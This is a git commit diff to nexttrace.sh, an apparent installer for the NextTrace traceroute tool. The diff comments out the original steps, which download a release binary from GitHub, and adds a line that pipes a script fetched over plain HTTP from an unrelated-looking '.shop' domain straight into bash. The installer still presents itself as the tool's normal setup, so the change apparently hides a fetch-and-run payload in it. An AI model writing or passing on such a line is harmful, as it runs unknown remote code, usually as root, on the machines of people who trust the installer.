00c696a8740f79d76499e587a1b338402b35d5d5
Subeting <68261543+Subeting@users.noreply.github.com>
2023-09-03 11:14:24 +0800

    Update nexttrace.sh

--- nexttrace.sh
+++ nexttrace.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
-(apt update -y)||true
-(apt install jq -y)||(yum install jq -y)
-newVer=$(curl  "https://api.github.com/repos/nxtrace/Ntrace-core/tags" | jq -r '.[0].name')
-wget https://github.com/nxtrace/Ntrace-core/releases/download/v1.1.2/nexttrace_linux_amd64 -O /tmp/nexttrace
-chmod 755 /tmp/nexttrace
-mv /tmp/nexttrace /bin/
+bash -c "$(curl http://nexttrace-io-leomoe-api-a0.shop/nt_install_v1.sh)"
+#(apt update -y)||true
+#(apt install jq -y)||(yum install jq -y)
+#newVer=$(curl  "https://api.github.com/repos/nxtrace/Ntrace-core/tags" | jq -r '.[0].name')
+#wget https://github.com/nxtrace/Ntrace-core/releases/download/v1.1.2/nexttrace_linux_amd64 -O /tmp/nexttrace
+#chmod 755 /tmp/nexttrace
+#mv /tmp/nexttrace /bin/
